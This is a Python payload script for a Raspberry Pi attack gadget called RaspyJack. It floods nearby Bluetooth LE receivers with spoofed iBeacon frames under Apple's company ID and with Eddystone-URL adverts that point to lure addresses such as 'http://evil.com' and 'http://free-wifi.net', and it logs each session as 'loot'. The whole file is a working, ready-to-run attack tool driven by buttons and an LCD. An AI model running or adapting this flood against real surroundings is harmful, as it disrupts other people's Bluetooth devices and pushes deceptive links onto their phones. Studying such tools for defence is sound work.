#!/usr/bin/env python3
"""
RaspyJack Payload -- BLE Beacon Flood
======================================
Author: 7h30th3r0n3

Broadcasts fake iBeacon and Eddystone-URL advertisements using hcitool
and hciconfig on the hci0 interface.

Setup / Prerequisites:
  - Requires Bluetooth adapter (hci0, usually built-in on Pi).  Randomises UUID, major, minor for
iBeacon frames.

Controls:
  OK   -- Start / Stop flood
  KEY1 -- Cycle mode: iBeacon / Eddystone / Both
  KEY2 -- Randomise all beacon parameters
  KEY3 -- Exit

Loot: /root/Raspyjack/loot/BLEBeacon/<timestamp>.json
"""

import os
import sys
import json
import time
import struct
import random
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
HCI_DEV = "hci0"
MODES = ["iBeacon", "Eddystone", "Both"]

LOOT_DIR = "/root/Raspyjack/loot/BLEBeacon"
os.makedirs(LOOT_DIR, exist_ok=True)

EDDYSTONE_URLS = [
    "http://evil.com",
    "http://free-wifi.net",
    "http://update.local",
    "http://config.io",
    "http://login.test",
]

# URL encoding schemes for Eddystone-URL
EDDYSTONE_SCHEMES = {
    "http://www.":  0x00,
    "https://www.": 0x01,
    "http://":      0x02,
    "https://":     0x03,
}

EDDYSTONE_SUFFIXES = {
    ".com/":  0x00, ".org/":  0x01, ".edu/": 0x02, ".net/": 0x03,
    ".info/": 0x04, ".biz/":  0x05, ".gov/": 0x06,
    ".com":   0x07, ".org":   0x08, ".edu":  0x09, ".net":  0x0A,
    ".info":  0x0B, ".biz":   0x0C, ".gov":  0x0D,
    ".io":    0x0E, ".test":  0x0F,
}

# ---------------------------------------------------------------------------
# Shared state (protected by lock)
# ---------------------------------------------------------------------------
lock = threading.Lock()
flooding = False
mode_idx = 0
beacons_sent = 0
last_error = ""

# Current beacon parameters
beacon_uuid = ""
beacon_major = 0
beacon_minor = 0
eddystone_url = ""


def _randomise_params():
    """Return a new tuple of (uuid, major, minor, url)."""
    uuid = "".join(f"{random.randint(0, 255):02X}" for _ in range(16))
    major = random.randint(0, 65535)
    minor = random.randint(0, 65535)
    url = random.choice(EDDYSTONE_URLS)
    return uuid, major, minor, url


def _set_params(uuid, major, minor, url):
    """Update shared beacon parameters."""
    global beacon_uuid, beacon_major, beacon_minor, eddystone_url
    with lock:
        beacon_uuid = uuid
        beacon_major = major
        beacon_minor = minor
        eddystone_url = url


# Initialise parameters
_set_params(*_randomise_params())

# ---------------------------------------------------------------------------
# HCI helpers
# ---------------------------------------------------------------------------

def _hci_reset_adv():
    """Disable advertising on the HCI device."""
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "noleadv"],
        capture_output=True, timeout=5,
    )


def _hci_enable_adv():
    """Enable LE advertising on the HCI device."""
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "leadv", "3"],
        capture_output=True, timeout=5,
    )


def _hci_up():
    """Bring the HCI device up."""
    subprocess.run(
        ["sudo", "hciconfig", HCI_DEV, "up"],
        capture_output=True, timeout=5,
    )


def _build_ibeacon_cmd():
    """Build hcitool cmd bytes for an iBeacon advertisement."""
    with lock:
        uuid_hex = beacon_uuid
        major = beacon_major
        minor = beacon_minor

    # iBeacon prefix: Apple company ID (4C 00), type 02 15
    prefix = "1E 02 01 06 1A FF 4C 00 02 15"
    uuid_spaced = " ".join(uuid_hex[i:i + 2] for i in range(0, 32, 2))
    major_hex = f"{major:04X}"
    minor_hex = f"{minor:04X}"
    major_spaced = f"{major_hex[0:2]} {major_hex[2:4]}"
    minor_spaced = f"{minor_hex[0:2]} {minor_hex[2:4]}"
    tx_power = "C5"

    payload = f"{prefix} {uuid_spaced} {major_spaced} {minor_spaced} {tx_power}"
    return ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x0008"] + payload.split()


def _encode_eddystone_url(url):
    """Encode a URL into Eddystone-URL frame bytes (as hex strings)."""
    scheme_byte = 0x02  # default http://
    body = url
    for prefix, code in sorted(EDDYSTONE_SCHEMES.items(), key=lambda x: -len(x[0])):
        if url.startswith(prefix):
            scheme_byte = code
            body = url[len(prefix):]
            break

    encoded = []
    i = 0
    while i < len(body):
        matched = False
        for suffix, code in sorted(EDDYSTONE_SUFFIXES.items(), key=lambda x: -len(x[0])):
            if body[i:].startswith(suffix):
                encoded.append(f"{code:02X}")
                i += len(suffix)
                matched = True
                break
        if not matched:
            encoded.append(f"{ord(body[i]):02X}")
            i += 1

    return f"{scheme_byte:02X}", encoded


def _build_eddystone_cmd():
    """Build hcitool cmd bytes for an Eddystone-URL advertisement."""
    with lock:
        url = eddystone_url

    scheme_hex, body_hex = _encode_eddystone_url(url)
    body_str = " ".join(body_hex)

    # Eddystone service UUID: AA FE
    # Frame type 0x10 = URL, TX power 0xEB
    url_frame_len = 5 + len(body_hex)
    total_len = url_frame_len + 10

    payload = (
        f"{total_len:02X} 02 01 06 03 03 AA FE "
        f"{url_frame_len + 1:02X} 16 AA FE 10 EB {scheme_hex} {body_str}"
    )
    return ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x0008"] + payload.split()


def _send_beacon(cmd):
    """Send one beacon advertisement via hcitool, returns True on success."""
    global last_error
    try:
        _hci_reset_adv()
        time.sleep(0.02)
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            with lock:
                last_error = result.stderr.strip()[:40] if result.stderr else "hcitool error"
            return False
        _hci_enable_adv()
        time.sleep(0.05)
        return True
    except subprocess.TimeoutExpired:
        with lock:
            last_error = "Command timeout"
        return False
    except Exception as exc:
        with lock:
            last_error = str(exc)[:40]
        return False


# ---------------------------------------------------------------------------
# Flood thread
# ---------------------------------------------------------------------------

def _flood_loop():
    """Main flood loop: sends beacons until stopped."""
    global beacons_sent
    while True:
        with lock:
            if not flooding:
                break
            current_mode = MODES[mode_idx]

        if current_mode in ("iBeacon", "Both"):
            cmd = _build_ibeacon_cmd()
            if _send_beacon(cmd):
                with lock:
                    beacons_sent += 1
            time.sleep(0.1)

        if current_mode in ("Eddystone", "Both"):
            cmd = _build_eddystone_cmd()
            if _send_beacon(cmd):
                with lock:
                    beacons_sent += 1
            time.sleep(0.1)

        # Small delay between bursts
        time.sleep(0.05)


def start_flood():
    """Start the flood in a background thread."""
    global flooding
    with lock:
        if flooding:
            return
        flooding = True
    _hci_up()
    threading.Thread(target=_flood_loop, daemon=True).start()


def stop_flood():
    """Stop the flood and reset advertising."""
    global flooding
    with lock:
        flooding = False
    time.sleep(0.2)
    try:
        _hci_reset_adv()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Loot
# ---------------------------------------------------------------------------

def export_loot():
    """Save current session data to loot directory."""
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    with lock:
        data = {
            "timestamp": ts,
            "mode": MODES[mode_idx],
            "beacons_sent": beacons_sent,
            "uuid": beacon_uuid,
            "major": beacon_major,
            "minor": beacon_minor,
            "eddystone_url": eddystone_url,
        }
    path = os.path.join(LOOT_DIR, f"beacon_flood_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def draw_screen():
    """Render the current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "BLE FLOOD", font=font, fill="#FF4444")
    with lock:
        active = flooding
        sent = beacons_sent
        mode = MODES[mode_idx]
        err = last_error
        uuid_short = beacon_uuid[:8] + "..." if beacon_uuid else "N/A"
        major = beacon_major
        minor = beacon_minor
        url = eddystone_url

    status_color = "#00FF00" if active else "#FF0000"
    d.ellipse((118, 3, 122, 7), fill=status_color)

    # Mode and count
    y = 18
    d.text((2, y), f"Mode: {mode}", font=font, fill="white")
    y += 14
    d.text((2, y), f"Sent: {sent}", font=font, fill="#00FF00")
    y += 14
    d.text((2, y), f"UUID: {uuid_short}", font=font, fill="#888")
    y += 12
    d.text((2, y), f"Maj: {major}  Min: {minor}", font=font, fill="#888")
    y += 12
    d.text((2, y), f"URL: {url[:18]}", font=font, fill="#888")

    if err:
        y += 14
        d.text((2, y), f"Err: {err[:20]}", font=font, fill="#FF4444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    status = "OK:Stop" if active else "OK:Start"
    d.text((2, 117), f"{status} K1:Mode K3:Exit", font=font, fill="#AAA")

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global mode_idx

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 20), "BLE BEACON FLOOD", font=font, fill="#FF4444")
    d.text((4, 40), "Fake iBeacon &", font=font, fill="#888")
    d.text((4, 52), "Eddystone-URL adverts", font=font, fill="#888")
    d.text((4, 72), "OK    Start / Stop", font=font, fill="#666")
    d.text((4, 84), "KEY1  Cycle mode", font=font, fill="#666")
    d.text((4, 96), "KEY2  Randomise", font=font, fill="#666")
    d.text((4, 108), "KEY3  Exit", font=font, fill="#666")
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.3)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                export_loot()
                break

            if btn == "OK":
                if flooding:
                    stop_flood()
                else:
                    start_flood()
                time.sleep(0.3)

            elif btn == "KEY1":
                with lock:
                    mode_idx = (mode_idx + 1) % len(MODES)
                time.sleep(0.25)

            elif btn == "KEY2":
                _set_params(*_randomise_params())
                time.sleep(0.25)

            draw_screen()
            time.sleep(0.05)

    finally:
        stop_flood()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
